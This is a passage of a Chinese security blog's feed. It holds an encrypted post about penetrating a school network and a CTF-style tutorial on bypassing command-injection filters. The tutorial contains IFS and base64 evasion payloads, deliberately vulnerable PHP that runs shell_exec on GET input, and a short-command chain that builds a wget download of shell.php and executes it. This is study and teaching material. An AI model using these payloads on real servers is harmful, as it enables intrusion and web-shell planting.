de07bb81ff2b776a7b1fc7da68037065ccd3de8813c6dba7022fa5ce64daed26c67b271e5cf11ea8b2dca790a34a1dc1a22f515fd1caa342dccb0a895378481bc8a4d475b99c23df594e77184fa1edb63ca3726c12c3f78b654d141be23b69b27bf92f56079cacdad86b13fe41c236f02957675b60b31ef1c79d3ccd3ed789118830d39e9e40f781a8557743eeea77dd795c5536ea5d2257b885cb1520e2090665d5a49a029ae122b62501189a1effd20897b5bb0156a8d39961f4256b4c5c8f723d32c56d50b2d5283c394a37fcb317ba6882802619769cd3d42373a6159bb2ccf6ec3ffd343eab06e416ed491606808cd3b5db229d2da11282902cb0c1b624cb55fd850b1d668e01253068e9a7e8043c27773f86d4acf5a767887086b8b59a5af4f84f1122395d97c51714834ae15be1d8f3aeb526f5027623b3a91d9c2acdea8af9f9d5843a06eaad188f945cc9db97d210960bb6e418f948cdaf53fe2702952e9dfcdc1c5f20d1c74e5a9b886694d67c6f4253883656d920db24158c2c9eed2fb141db4a4591061c52e61c30ed198957f4da15a6a6244df4083f0926a638918c64f2da27a208d7745e81f4157dac887da91a178633157c475ce6c6e9ba6b2254a0ae58521549e4c4781de260e5f5444219972b4ea3d36eadeaa1914013e2fe3b857c495bf8fa4ea13efb69dfeed6436a212136486e833aaf0c46e1e90f91ef53169b03549c2e39899f3f6b07d0baf8a6c213c1da4a1cfc2c40b75382fbec47032f9c8ba3316fd370aaad5a403357dec1167aa7bfb08091b3755fa830d3386071c477636a745518178271bd2912cf87348419be69752d8b104595f64fdc7f10d66fc53d2a0d957e301ab62eb62cfad6f368a35b156c4d48a2cc3f972ec556304a3f263d0cb0b6d3d21e702ecb35e1516bddf88de15fcf8b6596812ce783b00e82fcb25aaad20421debe36f1d661ff4528709af5b7118739a6e35bac8b8c839d692d27198f04bc4d30d570d54a562de7360e1ab848f4e4e2cfe64ac039501e2df3b9ae5d47a9e97bf843c3030c1f24119d219c3d92f0a1600ea8732a097af7ca54fddbb898cfef302e820c11312c02726eeb29dd701dfd721ea7e8d8e0a686a3e2464aba4aa98abdce5ebb67099dfada75f7440233482faf4839a4607a2d8af1bc3f3cc87e8b574b2ad165deac6d23a81318cf5c3d150ef908f3192038205a428c6ba3b49bb9ef4a2743f3db3c96ccd0a34f9d2c58c48b5c43653e541135224840230f7ed7e181193b8306f7538ba1ee8e4db4af915ad7d2b9c6ba64b7e065fd6fc96351e671093a2e26c3a887636286a3b70117ea311f90a6bdaca18e1d9cb7f01877a437ac099940e49545a13deec069cae20577a6c88de4749cde0de460c2417af7384b1fce9be8f02118a81a0af9a3dc7f5a8277598fb1eeed11b02067abffed25382fdad7ca8672b06da328f95a993a10027909f49db66923f461337a579423fd213c70dd177870620c1f514ff33a1cf1e63771db3f8a46c4d046c74486a9250bba4f1c365fb91bb56223b8cf2cda56e1b06af769a495b70730568f6d37d2da87ad06654b31880fc8536f7ae3e11dbfde19675654903ca13431230cc35bcc7d62676de66640b7856acb5f05720c43397d19a5002b49308044e1252813a91a3868a604470221abd84840e8b34e6551922b3d12d3bb40eb0c5b8b57b0086db3f87da48629e651e979828663bc7a7957799fbb76d291428ebde154d625008e0442974c725b95efdded8e232da5ea81b1eb578944603185bb3e18dbb48bfdfb5d29f933e61b7407dee02a7bbb239f74d08538945d1584f67ab9d53047bb5d4e6d55eb5d43257cf24b3a1ccb1453784be12573e6ece4d1587e21b42bc9c3caf18c83e6be8bb6cb21f8eed31beafc30262d898acbaf211181da825595a2f34bf050a0ccbb8a35618229d24e75206b00718799f0cf8effc94dda1696b9d6cc78e78901644dfa55ebb9b1024a2f262a1c2519f7b863bcefd612b169282b11ea70c906a7a0e4932876451c748c68b67f4f5db15ac060106b8db3b4eacc24faa7d793299e78cb369d0da848d358d3ca2f357c4d8934260f9a6981d76ce3fe32a9642d3bfd9d17e0728b4f5c86185a3e5e0be84a2baffe5052a409f54de4c2cd35a3f770b90ef810b6e78dac1392d644a2c2581801d12c3844cf99283633c1eeda88a93c4300b15e80cf8b59fa818b2bdee54d0e54f8269d42796820f3b2b6b8e39a9cff1504412a90afc0c8d33ee95635ecb6e555bf5c8f6aba54205d62d4a06355b61d3fde52ee3d7291f52043e6c88fec0ef7f13511d469c9605ce75a1aa724d6c8128c1bd8196f4531cbb424137c7eebefd56c26aef054fb0b1fff1d8cb1c8c097f4a337eb66163bbece7f73c22b7bb93551bed1c5352bd0797884f555a6467a24739fc6983feb7a69b3fc109b3f9dc9947cef403475dfe883e2b61405d79de5fe31c02971617972df5f5f44ce9183b7ae0b536aa384e3d95ad0736c412141e0577ddf98e37864376b8f73573171cd08b301420bc3e4242763e1730dbea10a26c34f57b4ee466ed6f1d7305e85487f141fe57e1898615d2e568b8cdf29ddaffec5ee46233340f8cf272166f91e6d78e7e3b2f597b342307c84cf1c11bab02bc6cba00bdb9b110061e23c1b7e4f9f12e5cc307ab743d82bae6adf2ab404e15ab1af59fc14fcab73a7d92bf5fbe88f81e8f7fc7876533015dda330f8d9785b05bbf988c12ffbf27ac834c5b7aeb1a0a8377383025dc13fe6f5fb3c4bae358b0b499f149a77f0f68711aa419a48b6847035e237cdef79ff709c1591ff3b811e891760d30446d5babed6c8ddb9c2fe7e98b345e348d739e889eb14ef019dc110ba94b5b778ce784b4f87059d7fdc91a449bd1de4a4d8be8b9f17cc834bbff23adde44f4347c107b80fe5cc697c58cc4847f3c4df542751c9271defe12c63223e6ae462a69b1fdac2a9ddf59c68bb1a8b09b3d2b3bf21217f1c0538b9a7988d4e3c7dd05b0a32251969791fc9b1a955a4907510a2d7e299de24d2016b147fd28b510de8132de648d465ac9b38c7d5a3b687aeabca7e51354869e9df59d0816209ae9f8cafa8331563d54f78f2b230eeb1d6b6825a70247c314b1e56f0fe3987690fdded4f07d6a986279c578cbd9c851d4db0edfddf70158c30cd2c47391777638e17cd4959b88ff3ebd38f82200fa840d54715b278db0787f70074b3db9fc40dc632c5e1b988fc2207ccf6e4804adc66445f856938aa25a44485893f0fd968328b98a59f40b85e4ae9b59ffe1785096da3f67a422f60fe0f33c633ede14ae9ea373fb3ac8e542f3856245ef1954b0a8167bf121188c4016e6164d10ffc18e71cfccde79ef819a0d8f70435a1515b4a5e4c19605a2daf83e7687502cb806447fe9e3adc285276cf4f2f85ae581028d62bd930a8db855c702be6f8596d938ba5df6f589849bde93760ae630bd0f45b3bcbc5a9753d01fbacc50f0c0d274a35e9bef8b733db0d7ed557d708cef57b1d1263899dd6090a74ddb0301e8947498791ee8ba79575107f40f784184d0ba8034a66c5b2774f2b07b9e2950d1d32930603e749dcb05ff982518982d758c3052828850d9e970f0204b468427b3372220a81daf6f63b7c2ed3503fea89682b0156c9eaa0854b31cc54fe22a18a2f64335f847c3dd5eef2318d24a811502021da6f7ab8ae982e0ac828e2ad81b1c57368e8eb9251f696262ff90b18aea8f84ca5dc91d14693cbc4a4dc62ea65d5314bedbc1a214dc057df93557204d50c87f0d74003814ac19619e8072c3f9901c027b3fc693e30b18c402c7b34b9f5f766376b49bd942731998570dcb5749deacb45fac01ad882a7e9fb69e121092dfa311b4238c36024a528a9b94c7ea11444516acb2c2b816ea4cc03fbe5b862ba70f15e05d3ddecc15f5a516050369334e8b6fecf185e860e96634c0f7bb086a1f3e1e394a7e10427e627ad41026d3f5e2f9b06e67cab019a422f7a0162a6c4c7c7961ece5e2e3c0c917cc54c572b4139be46d7ff8d2e4778e594887f96d739305f0ea031ff3b44c3ccbd5df2ed18f3ab9aafef14e5e6aa95de02436fdb82200bb2b9f0237531b83a059fd13bf92c7dee4f7b611da7bc0003666fccefaa3153d840846e5b9c4f4206ceddd0e57b52a0f5aab8c5190b98712d4b118f92058b4e4942751bf19436bdc979424852054b687fd8450497411a033b2292c82ecab6a5726c771a2d564636de410e1e9048a62296fa2de43e8081fa29aeee2832db59fdb16e69d2e24d758589867b6071a1604c5c757a65bc170d38c631dda7004354cf008b884a8de4a27bfa39ce10ee036d63e0f780f3cb2e750f02584b2d686e9d94cfae1c30eefa0617f3f85909f6732d6a3e43e8079087f805c2746cc0eb2656d1d755cea099ddbd288c032551260ff4d44641e761c02b83b6dae3e1d5d39c6446ad2c5c4d647b83b031ca0009b475851f922c15762e08e03777bc5ed863a1950ce53cc553b090a90f9ecce613c62f22056709f2e3d3caeef242828cb6cfc75e67f55949e2134610699992877ca7cee9822a075ad057fb653587d4e3f838e0dff2494bcb41ba6eaa2d7cd203bc4fcb2431c5d641d3916ce114a51d71374f0f1e4cc0b465944fa3beff1388eacea155b4800f2ab3944ba3ee131fcda388f63f94a72c5e47efc2c48cadcf6699a57e3ce2fbf5fb56c711f7c010943e02dc41bfcc0c14b8d4a9f665c1fb1d4495c23fb73e5756ba8000bc6819fdc24433e5bae9e2d8a61a795a15a3b82d3cfa4114eee489eb36b29173d716e4ea8e35acab0b3c8ce75423cfa28b9cbe21c496e80bcae09a47eee0bfa3e22a8b20e84e05723a01a08ddf58bf2c3c7075ae040b3fa467bf3dc98b846498ce0a4eb0910d0cdcbd55a798c31cc3a34eb24b608e7de0f49c1cf623fa456c56745121b68d6788db61660c4052986160f8a1e2ebf1e64549003c6e286bd1bcc6ab3c26d11e04c1a44ebf175f31ea961f57868ad6d49136a404286fa7b65e2ab355b046041e9ad461a7107902c2e9e37caf24a4d60e6acc9ae926984961eb6768f3c5833a4314829a94264066b1ad1d32f6027528be6be5e3d44eb08cb8393eed20bb097c7c81e415ceda87fe358a1af6277aa78f00edbdd1a8b2713f4f125c36557e4f0e913a85f53a259edfdcf97c0b293b3b659b60fe932f17ccabe53dbd84aec2a3ab0b94eab1560836cfb1d90f38791f1274b19d7850199f63f5e660e2e5bd5d0310aa10c3795f1ad3bf3728ae12f2649a4d877072114bff24d5f5f2ed40aeba7e587b68f06bf9264c506c7551e0d2c56268192671f6d162a39967b7d5beba4bab53dfefd2eefa3eb5de91085cf94dc54272d7f6faf55d17c90ea9db578db5fd1771889ef8f031bce93050642d29c8f00a1e3c5276b5bed4b9be9f0412d9685677e4471b55731d372dbd36dde43ba3d9307a8617b8011fb4963a3768e033800cea84200436fb8db0d022cd62a14ced4294244bd423936507517d2d6c1b4d3ce9cb70d10de56b63f0df08a0eca2816f1d725a3200af8ca4ba4e62c5f0edb9b15d6c7859ec5ee3baa3d7076e94e330eefd8eef5513b03519213b9d8584b9738982a62c79e51c4ffe9e5ec5687b9dccbe78de77ad9a358f2b8ebd1a9d3da0866101743b21d7c8cbf76536a709f97d888bb31299cc6964d5425c975ea495f58ee70e6b8867b2b649d233d8b3290cb7918e1dac5a84804189fc28206a17ecd70cbfffc6629837e013b9b97f40f92e5d45ced0ae91145fc4f7ad0eeb12d7bcb636503475d66f6b8ca5e7c973d06f20b7ac3a04ffe54a3e6d333426f25fb8460259e2ec697f4fed3a7971d9347650d4195aaa40dcb584928941d5a046344810e195bafc9825b76968b0798f13a17f07c6de13c82be0a786c9aefd2c268dfa5bd484ed8cfd75517a8367b83438d50fd1960189ff5a2114a44e6744d67cf55666ffc7875781178db7341848df053b06751876317fc9014363cfc152a0d460a6820d9f6a005478a42bc031769d32ba090973cd7830106e8852b6a632e4161d35eeeb182bc64c21432a094e91618e02e48e8b6dc202e86b74399990c3af8995b70480ac4bfdf68d1dba258b554cd1594d04f006ebe4a5b554ac2395707710d15f14de09f6bd094f8f88134c8e51f67e3c1a7cdd7a23a14facac872c4dad4ca419536eaa54f9d2df90944d8be6d4e0cccaf25397965419489d4a6ba633eea1b686ce39085e8711ce29c425a295abad610896b1eb417b0fd1e0ce30f263391a64aa7c77795f5c749bd14f5fe3c810bb4df6261b1a799ceca2f9f12b56052f308a83e69b8923c749b487c12a28905fa659bee5b111211be4eb0cc2d6a6d7983ccb5e8ce9fc8a97c4dd6495d70091f73744ffe66b56e96dea8ff4998b3e625b8817c68b18ef3a9d692a756ca9caafb2f84a8e55e7db98f8672f141f0d1bfcf5b4eafd24b4e34bbbdcfeb27e231977913917899332fa8f0ff81fa81bb2f7b7889e0535d080a651e8dcaac2384bea4d482ca744445365434e031ffd37e5bf81620241a9b9a6df38e1ac07389eb64bc1d9591d98cc543735562a1b03f5fd3884a2fd0567b05f16350d78087839d963731907de99c88d4044c897e5786beccd69f52a1a857759c8af3e0f35eefebb16ff6133bdcd5ed4744f7695fcd0b0082955f8622e95eefa98885010d66fa63290c4aee502d856ed927c4ffd299995d5cd3716298bf9fe316cb9b640c7de8889d14522e94b953ab76fb114902c0095c9c28e04100cfef6aad4dce8ab8af97c513d0ed6b4f17b6c4917387849394138958157723d29b56ce9a098f2e8a6ffdb590686fbb8b0e32a867a5b8bac68c21ce1bada250f904f7ab19754b00611ce7936dba77ee0f5338baab57f29f8d9ed4e835e65ac603771fada1a7b2b8ea0bff3d46a91cb6a53a9c709c067d6279f90e7cb1e4eb8c9984e8f33ac23deac742c3cb2ca5f7832dcd08631b1e162d20fc9d1e6a920d631820cee9396419c988a7b367291ce8db4bc307ae8277a36deeda2fd74e4d02608e4e0bb825caa3e183a0999800721f0a8b5e0a3dc2514408b36b31915a0b5305ce856da80b99f0e14b7ec0d31f14ca4cb2142a9de09ec15b00b025fee7a239b507a5075d851ab8dc9d79955e25543e4c0a52e7ffbcaaddc33740fc5b59da83dd08f7679895e1544e6916c1a938700720290ba07cd9f58c9e73cf237a0975d1468a2356f6d51dd84fe2865c9a1a116238989abbd29d01bfd595d65e3e4c5370e9fe2defbeb5c0efff922d12fd7e55c45134ebbd68807c86dba48c5bbde949cdb83d9afecb759a1904f3cc17c9c971e11c23def32478bf879295585d27f26dec43c6a9463a547b69845c4588c6e1ee2c21754d62450306f2ec5ee2f1196cc912207e44f5fc6b7a7a4c1d646344f172a77294157a1cd8c4ff0066c4148402af27d677fc0d47c9a481ba50aaa267b17e231561393d148faccb49d084fe5a949ffc76871b5a92e404bb1ea31ec078d498986de10abfe9f5d3dfbc15bb7d949e153e62c5897720425dda36698a06dede11f2dc12292172516563b4f27e6b85e860c32ba4d7385433b04835d6800ab7b6ac91e8751907939501b93c0b663e2120b25be256ae89b3a92060ba419a471a28a7ec49fbfed4ddbb0903620d727c9e47ef23f11a87f8b4e364eb353052a953b41fa6cedb36cc09c1fca490745a83695ff5c88cb4e868a95efea1c6175c9c35974908dd3459f1a343a16665f0112c77bb213f973f9035ecf59918090b48519f9796c0c2042b74b7816e51404a5ce3b10b651ba56bd7356b611e93eee1c72a07dc61ca6b07183ed37cd8b3c4b71b7e9b565321cc2e3cce14be80ff3a0efdd95248e10a08f69a3e1ebdf01ca69be7e659a3d310cc97c79a612535d2244bf97e03dfb3137b61c6456c4d499edd6db8cf1ae688f5aceb51fda0388e1a6b2a3859f3a3fc55d8c5150902795c03c06573d260527be2b5a95cfb18ba5daf2e7e48187993bea9f4d96ea0fedc4b281bda054383ac78b2efd2eb9f764de7d5d304aad4249873e1c721a4fcfefb70ff471af74d7e6bbbe67d71d1060ff1f8446e98e175125ed89dad9f818c62dfce0c704dbdecf4b0930bd931bb913081fbf63336f0e5aa410f18cf4a5c911a494af8c180f5cbaec82a704cfdb05b50225819b0ce5568fc14ae6c822e85d383a88bd906503690fa036739080bbb51c55485bfb7c9a4bb1c45f97c073f7ca6d1bd5ce226e9b8d336d7ee39877660e1e070ad31a3041ed34c2fe4829cec1de22bcc5180c73e272e184fa47e54ad185590296744085d08b245c1cebdb6c5d26a1ff54eb388108e354df7655d2a8450a2e053bc11561846978d688122e624cd4c21f0b7e6b93d714c71cbb0c188f3e3852b2d49b43cc2c99cadd14e5a91c645366dc780fb9444a20a3ba651fea135bfb6a0543fab85f3af58cb705db86aba567b0371936789c98505dd290b6c1bd7f3aa08e61d347321883431b6d3c3183d37ad0589ca9c2bd7cb209c99b2348e3ff3a9ca88ed2b86caea3321d5f9c51f25c9951035c4ad714b9fba4daa61ede95223c338377efd0fc502a998d7c2994d9af8c1224b0d3c11971fbcaaecc441383f221c01baa6c01615e03b275922674997a2205d2ef6df65c9765d9476c0b722e240af2c2a8b40c131c32b707cd4e0cccce7889deeaab58b63d7283fd7841f9889e6cb818d05a7b0faa70e2f9532d2a38baf830f30fa7071a515e6b6c1c650cc33e37f591ef3cbf6be0f7901d2b61794f691069d585b2512524dd14651785b4a795790d89d38bff57d83e3d7a9e988509d0b488d9624ae1733ccab4ac4fe47485876aa5da6b069091843b7a00334faf71562154a09d85998990a3ab1c6f4606278d2be0ef82ae192acc5379ee08a3a6bd84b929ce836e9e341d92c8f365bc3fdbb2198668222412e0988152629cf1ff5e6629cd8b9b72d2cf7126d7898ff5799c4f046bf7067bd199740e885c5961de2879f56b1e7b4e0a30fb35c613976782f81ac49c586f1536b27861e863aa82bfa628002c70c63a12d45f339bfcef1245f5ef1de9b89b3ca6c6263d08da437b4ad6f2d5b3c250a7a0ce98704848f952a722911ff59e0a36956fd1aa83eff466f0e3a1c430907941d5a1d9e8bdbd930a1581b9371751ccd6e704b057da5b83683c33bf7388cd019e4781b9656dae4b25e4c21f188c7b0bc6ef0a2c6c4eedf93a5b2e2c4af1f71938a61bbfbdaac9833833f4d84c7f77bf6097f29dac4c3fb27dc39ea9c5c29265a8aaae321f56178b413e90aea8b9c1152340037e4a39a98e6e27643dcd66388aad9a4642673e6c4ced0879f1394608b974245d3893ec035930cc28aa813e31bd26d17f058150f8255c851702ce98ab3365ca7595320d7826019bee4b244726adf5eb5e9293d686ebc8fcbff7ca1a5fe948fa4d5307954a1c67953a4e5a6b549f8090dde71d936c23252766255fce932fb16353bd168ff9ce5c2d6d0ef52032a4928b4732e70c60307b10964739ce5b4d84f17c4134a373931344f8a1feed4b09c8db77f46a163f7898fb9e26fbe4a18650cac6f2c07dce7f4ba2bb4e3c03304375676aa4875130cc2f7dcddb290fb1b7044dc1359a94eb64a2b473a5c17c0ddf15275a116875f898d5f14e07dc108f29540d42e5bca4c7dfdaf7bd99723df349b0b1c48e3b854267ebd4da191b08f4ae9110da34ee8ce4e728a48021bf37c35bacac0eafcb640ef0f3ae8a44a7d9ea37f85aa6a19a376c3d8eb480b37a92bd0792989993089e70e5c7a85e3feafed9d5dad32e4225e4f069956c7df2c4e7755a683892d624db44a9d8fb61fc019de7cbce1370d50ae8550e72f1e9721510aa44d28b889f9ab12c696b87931fcb230e7c73cb7a80b518e0ff8567e9532baa7e2b2b8bb9f3b92254557393b4eb389208c733f807ab5614f9b4c1f7d8bc516a9397dc1a0f9bf87add8e623b19453b1eed9d023829ccfc1393346bab66504f2b83ae500ef52230ef9a77733566eb3acebd3ecf612c8f87be31e88f5b4d39923f13b215007eca50eff4c15a7c092236811fbd9d8d1c996646399d1baf08b42dda53bb2b0725afcf57e419cc3af7509f7dc2125c6e7d76b157a8f9bf6cb8046bf9f5afa0fbd1517f424ebd1253dd354734b3c242d45c4ffc4672a8240051de03afed6ae93283821bd840138bc00471a34497b72edb5cc26d69ed764ea96d9e4ea82f947911bc73676ee9762096fe958032c7bb21abb758727a726c6055652d0cee0d610766c471b01563ab4b660601f9acd26ed936f1851194d873b9c18e54d83bc67ed21cdf2f0823d95d8c7c9ca8977646b14edb82252b18d386a4e0f084798af7f2a2dd12669f26b5f6ff342ed17a8481ce573456b9dca2ed81f6c5bab72152577e836bc44bb275ae67588a8849056abe8f4cda4f9dc578c54cbdad6ffb53d52f4395560c5e42950c171a78a009980273742ea2bf10196c8c5edfaaeec98a7a4d04bd747babfa2f5acb2b4c4cbbbc6992da811d4ae0ab4ee8eee76a3ea9845b89e6b1f96adb4951adebb3320e293e7cb75cd0e933eb4e985ee708a92c95301b9e70af2459e5eff79f6a889ba3544bff76a6b70d11272fa1ac95f1552b67b6523f4a8e3e344cb338d28aa49f807fa9419cace1eb5c1b84e04226b0a995aa6dd9874b88ce42f327b511ce3aee82af233c70782c698f620834c53077de297a25e54c9d315b0bf088c6831c3f0fb82066dd5f6f9e5678798a97d8a6f52b206c3812b85e6699b5c734b632feaef7b7bd4686af999bdf1b78eeb128743689a2336652178e1e3fe497e5d3b541e85e4652d00bf52b87486fc1fd05c03f41ec891a40fe41b064b57bd0fd58babe44181f738240812b38064213debda39c058f4a54d5165e4e396199327f79e65ef0d5c7483e4c13b561018e5b4e0abff69b2ec41804c335251e763c3e28d65ba78775b7d6d4885df8591135af9229e99bfc398d77b9f4572fe5b4df921ccb6ed8270403e73b2d770d9601c562602409c6f49a6b06c2e088d4b53c091c78f574fe36564f0e6d2575c6ad2b4f014b5747b11ebc319de8ee30d6482b3c179c8e1385a2b6cae334a641d1fb20c66e9b04cc372333dae9ce957c68e8fbccd6d9283b8c52503de9fc62a92190aeceff717d7937ab3fb41b883ee3b3cfb07951b2c2ec83e3528529fcb816c37575ddf42bbde61205b76a9cc3881e871c9289d3dd07f1e9875eaaa6f720695e1013af2b70d6a11d5b9706b3a45c8f480ea2661f2c3ba6915110376fb798c46fb8c20c6e92ca292e76911bcb7adaac4249970bf1256cee1bcfc148b7c743e89230ee4129ae25b6766369e672d6b599f0d4934c44e546f53af24d243ba8ee93c8fa56ef3989b87fce647e0e6460f377700d677603de474cda1451ca8ff46be7cf3ef0d045026c9156c70537f25e8639fb8f718995e3eecde5d4562174e38138b1d0fb61665266c05a797d774160b823f6756c13b4c10f0bcc2e027a3a216b5be81df8c6ce9a804fdf7fee6555fd2676b839e58c2b1457cb37870b4e306db92082ceb94b2b17b3b2bc170ad11b226359380eb3cb814898e41ff77435418f684435473f271ec3732595bc3d5db3033f9a924ca516775c5fa7f7a1bc691cfd32e545c6065d2e79b503a7a36be9370a0f730f781a9125e4f965a87cccdef2e897616699da0f43cfe7fe46745896fdfb52e34b8f884afb44971173c6972800110958d08a27fb860f2fdcda0895d60c18ca9e5093ad103794812ca523e1eb4eaad41ef65ee434521d43cd75c98d30a8e0c3b5612f16f0bf5d8d4cdc0dbdc19d8b43799614e55dccb6a3b1146d61b459b87cd14181b8642ebe70642f47ac7575c0271274ee101222f34cfb9e3d1ac3a2b21c93eb7b3f49ac443a0f70b8223ce428e585516d182264f3acbd1d05ba3a7b41b74d797cb20515925580942d8ac5098f09ba20fd854ac24fc4071f9d9a32733ab7a39fbdcd1409f60b0b1f59e235b70fbeafd1d200eed0d2f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      免费给学校做的一次渗透测试
    
    </summary>
    
    
      <category term="内网" scheme="https://0xcreed.jxustctf.top/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="内网渗透" scheme="https://0xcreed.jxustctf.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="实战" scheme="https://0xcreed.jxustctf.top/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>命令执行与绕过</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</id>
    <published>2020-06-10T07:03:32.000Z</published>
    <updated>2020-06-10T10:11:54.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1.空格绕过"></a>1.空格绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>flag.txt</span><br><span class="line">cat<span class="variable">$IFS</span><span class="variable">$9flag</span>.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$<span class="string">'\x20flag.txt'</span>&amp;&amp;cat<span class="variable">$kg</span>  //(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure><a id="more"></a><p>$IFS在linux下表示分隔符，加一个{}就固定了变量名，同理在后面加个$可以起到截断作用。</p><h2 id="2-命令分割符"><a href="#2-命令分割符" class="headerlink" title="2.命令分割符"></a>2.命令分割符</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span>a 换行符</span><br><span class="line">%<span class="number">0</span>d 回车符</span><br><span class="line">; 表示连续指令</span><br><span class="line"><span class="meta">&amp; 表示将前一个命令设置进入后台</span></span><br><span class="line"><span class="string">| 管道符，将前一个命令的输出作为后一个命令的输入</span></span><br><span class="line"><span class="meta">&amp;&amp; 前一个命令执行成功才会执行下一条命令</span></span><br><span class="line"><span class="string">|| 前一个命令执行失败才会执行下一条命令</span></span><br></pre></td></tr></table></figure><h2 id="3-黑名单绕过"><a href="#3-黑名单绕过" class="headerlink" title="3.黑名单绕过"></a>3.黑名单绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span>  //变量绕过</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">"bHMK"</span> |base64 -d` //base64编码</span><br></pre></td></tr></table></figure><h2 id="4-短命令执行"><a href="#4-短命令执行" class="headerlink" title="4.短命令执行"></a>4.短命令执行</h2><p>大体上的想法就是通过重命名文件绕过，然后通过<code>ls</code>来将文件名写入到文件中，<code>&gt;</code>这个重定向符号可以来创建文件，其中文件名是<code>&gt;</code>后面跟的参数，然后创建出我们精心构造好的多个文件名，然后通过<code>ls</code>打印出来再重定向<code>&gt;</code>到一个木马文件中，就可以执行了</p><ul><li><h3 id="拼接方法"><a href="#拼接方法" class="headerlink" title="拼接方法"></a>拼接方法</h3></li></ul><ol><li>两个反斜杠<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来反义后一个<code>\</code>的。这种方法的话需要精心构造输入，利用倒叙来输入，然后<code>ls</code>的时候需要加<code>-t</code>参数来排列一下，虽然报错了但是也执行成功了</li></ol><p><img src="/2020/06/命令执行与绕过/image-20200610155026769.png" alt="image-20200610155026769"></p><ul><li><h4 id="七字绕过"><a href="#七字绕过" class="headerlink" title="七字绕过"></a>七字绕过</h4></li></ul><p>题目源码如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;php<span class="string">\\</span></span><br><span class="line">&gt;ell.<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> sh<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> -O<span class="string">\\</span></span><br><span class="line">&gt;com<span class="string">\\</span></span><br><span class="line">&gt;idu.<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> ba<span class="string">\\</span></span><br><span class="line">&gt;wget<span class="string">\\</span></span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure><p><img src="/2020/06/命令执行与绕过/image-20200610172713846.png" alt="image-20200610172713846"></p><ul><li><h4 id="五字绕过"><a href="#五字绕过" class="headerlink" title="五字绕过"></a>五字绕过</h4></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) 